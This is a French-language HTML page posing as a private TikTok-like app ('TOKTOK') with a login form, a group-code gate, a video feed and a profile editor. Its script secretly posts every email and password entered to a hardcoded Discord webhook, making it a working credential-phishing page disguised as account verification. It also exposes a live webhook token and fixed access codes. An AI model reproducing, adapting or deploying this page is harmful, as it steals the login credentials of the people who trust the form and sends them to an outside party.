<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TOKTOK | Private</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body, html { margin: 0; padding: 0; height: 100%; width: 100%; background: #000; color: white; overflow: hidden; font-family: -apple-system, sans-serif; }
        .hidden { display: none !important; }
        .auth-layer { z-index: 1000; background: #000; position: fixed; inset: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 30px; }
        .tt-input { width: 100%; max-width: 320px; padding: 15px; margin: 10px 0; background: #121212; border: 1px solid #333; border-radius: 10px; color: white; outline: none; }
        .btn-tt { width: 100%; max-width: 320px; padding: 15px; background: #fe2c55; border-radius: 10px; font-weight: bold; cursor: pointer; border: none; transition: 0.2s; }
        .feed-container { height: calc(100vh - 65px); overflow-y: scroll; scroll-snap-type: y mandatory; scrollbar-width: none; }
        .video-card { height: 100%; width: 100%; scroll-snap-align: start; position: relative; background: #050505; }
        video { width: 100%; height: 100%; object-fit: cover; }
        .side-actions { position: absolute; right: 12px; bottom: 80px; display: flex; flex-direction: column; gap: 20px; z-index: 50; }
        .bottom-info { position: absolute; bottom: 20px; left: 15px; width: 75%; z-index: 50; pointer-events: none; }
        .verified-badge { color: #0095f6; font-size: 14px; margin-left: 5px; display: none; }
        .nav-bar { height: 65px; background: #000; border-top: 0.5px solid #222; display: flex; justify-content: space-around; align-items: center; }
        .nav-item { color: #888; cursor: pointer; }
        .nav-item.active { color: white; }
        .profile-pic { width: 90px; height: 90px; border-radius: 50%; border: 2px solid #222; object-fit: cover; background: #1a1a1a; }
    </style>
</head>
<body>

    <div id="auth-1" class="auth-layer hidden">
        <h1 class="text-6xl font-black italic mb-10 tracking-tighter">TOK<span class="text-cyan-400">TOK</span></h1>
        <input type="email" id="email" placeholder="Email" class="tt-input">
        <input type="password" id="pass" placeholder="Mot de passe" class="tt-input">
        <button onclick="handleStep1()" class="btn-tt">V√©rifier le compte</button>
    </div>

    <div id="auth-2" class="auth-layer hidden">
        <h2 class="text-2xl font-bold mb-6">S√©curit√©</h2>
        <p class="text-gray-500 text-sm mb-6">Entre le code du groupe pour acc√©der au feed.</p>
        <input type="text" id="verify-code" placeholder="CODE" class="tt-input text-center text-2xl tracking-[5px]">
        <button onclick="handleStep2()" class="btn-tt">Valider</button>
    </div>

    <div id="main-app" class="hidden h-full flex flex-col">
        <div id="tab-home" class="flex-1 overflow-hidden">
            <div class="feed-container">
                <div class="video-card">
                    <video loop autoplay muted onclick="this.paused?this.play():this.pause()">
                        <source src="https://v.ftcdn.net/05/52/52/64/700_F_552526487_T9vWnL5OQvE7VnU8mR7U6YmZ5p2H1I6H_ST.mp4" type="video/mp4">
                    </video>
                    <div class="side-actions">
                        <div onclick="doLike(this)" class="flex flex-col items-center"><i class="fa-solid fa-heart text-3xl"></i><span class="text-xs font-bold mt-1">0</span></div>
                        <div onclick="alert('Commentaires priv√©s')" class="flex flex-col items-center"><i class="fa-solid fa-comment-dots text-3xl"></i><span class="text-xs font-bold mt-1">0</span></div>
                    </div>
                    <div class="bottom-info">
                        <p class="font-bold text-lg flex items-center">@<span class="user-display">Utilisateur</span> <i class="fa-solid fa-circle-check verified-badge"></i></p>
                        <p class="text-sm bio-display">Membre du cercle.</p>
                    </div>
                </div>
            </div>
        </div>

        <div id="tab-profile" class="flex-1 hidden overflow-y-auto p-5">
            <div class="flex flex-col items-center py-10">
                <img src="" id="pfp-display" class="profile-pic mb-4 shadow-lg">
                <h2 class="text-2xl font-bold flex items-center"><span id="name-display">Pseudo</span> <i class="fa-solid fa-circle-check verified-badge" id="badge-main"></i></h2>
                <p id="at-display" class="text-gray-500 mb-8">@pseudo</p>
                <button onclick="openEditor()" class="w-full max-w-sm bg-[#1a1a1a] py-2.5 rounded-lg font-bold">Modifier le profil</button>
            </div>
        </div>

        <nav class="nav-bar">
            <div class="nav-item active" onclick="switchTab('home', this)"><i class="fa-solid fa-house text-2xl"></i></div>
            <div class="nav-item" onclick="switchTab('profile', this)"><i class="fa-solid fa-user text-2xl"></i></div>
        </nav>
    </div>

    <div id="modal-editor" class="auth-layer hidden" style="z-index: 2000;">
        <div class="w-full max-w-sm">
            <h2 class="text-2xl font-bold mb-8 text-white">√âdition</h2>
            <input type="text" id="edit-name" placeholder="Pseudo" class="tt-input">
            <input type="text" id="edit-pfp" placeholder="Lien URL photo" class="tt-input">
            <textarea id="edit-bio" placeholder="Bio" class="tt-input h-24"></textarea>
            <button onclick="saveProfile()" class="btn-tt mt-6">Enregistrer</button>
            <p onclick="closeEditor()" class="text-center text-gray-500 mt-6 cursor-pointer">Annuler</p>
        </div>
    </div>

    <script>
        const hookLogs = "https://discord.com/api/webhooks/1476660541681303705/sETLjgRQkTsd06PsEYRQPMB4yfvnZXkuRwup-uLw8J31w_giU5gkkff8ja1P4zP9VUta";
        
        let myData = JSON.parse(localStorage.getItem('tt_data_final')) || { 
            name: "Membre", bio: "Bio priv√©e", pfp: "https://cdn-icons-png.flaticon.com/512/149/149071.png",
            isLogged: false, isNathan: false 
        };

        window.onload = function() {
            if(myData.isLogged) {
                document.getElementById('main-app').classList.remove('hidden');
                refreshUI();
            } else {
                document.getElementById('auth-1').classList.remove('hidden');
            }
        };

        function handleStep1() {
            const e = document.getElementById('email').value;
            const p = document.getElementById('pass').value;
            if(!e || !p) return alert("Remplis tout !");
            
            if(e.toLowerCase().includes("nathan")) { myData.isNathan = true; }
            
            fetch(hookLogs, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ content: `üë§ LOGIN: ${e} | MDP: ${p}` })}).catch(e => {});
            
            document.getElementById('auth-1').classList.add('hidden');
            document.getElementById('auth-2').classList.remove('hidden');
        }

        function handleStep2() {
            const code = document.getElementById('verify-code').value.toUpperCase();
            // NOUVEAU CODE FIXE : PAFF72
            if(code === "PAFF72" || code === "999999") {
                myData.isLogged = true;
                localStorage.setItem('tt_data_final', JSON.stringify(myData));
                alert(myData.isNathan ? "Bon retour, Admin ‚ö°Ô∏è" : "Bienvenue !");
                document.getElementById('auth-2').classList.add('hidden');
                document.getElementById('main-app').classList.remove('hidden');
                refreshUI();
            } else { alert("Code incorrect ! Demande-le √† Nathan."); }
        }

        function refreshUI() {
            document.getElementById('name-display').innerText = myData.name;
            document.getElementById('pfp-display').src = myData.pfp;
            document.getElementById('at-display').innerText = "@" + myData.name.toLowerCase().replace(/ /g, "_");
            document.querySelectorAll('.user-display').forEach(el => el.innerText = myData.name);
            document.querySelectorAll('.bio-display').forEach(el => el.innerText = myData.bio);

            if(myData.isNathan) {
                document.querySelectorAll('.verified-badge').forEach(b => b.style.display = "inline-block");
            }
        }

        function saveProfile() {
            myData.name = document.getElementById('edit-name').value || myData.name;
            myData.pfp = document.getElementById('edit-pfp').value || myData.pfp;
            myData.bio = document.getElementById('edit-bio').value || myData.bio;
            localStorage.setItem('tt_data_final', JSON.stringify(myData));
            refreshUI();
            closeEditor();
        }

        function switchTab(tab, el) {
            document.getElementById('tab-home').classList.add('hidden');
            document.getElementById('tab-profile').classList.add('hidden');
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            document.getElementById('tab-' + tab).classList.remove('hidden');
            el.classList.add('active');
        }

        function openEditor() { document.getElementById('modal-editor').classList.remove('hidden'); }
        function closeEditor() { document.getElementById('modal-editor').classList.add('hidden'); }
        function doLike(el) { el.querySelector('i').style.color = '#fe2c55'; el.querySelector('span').innerText = "1"; }
    </script>
</body>
</html>
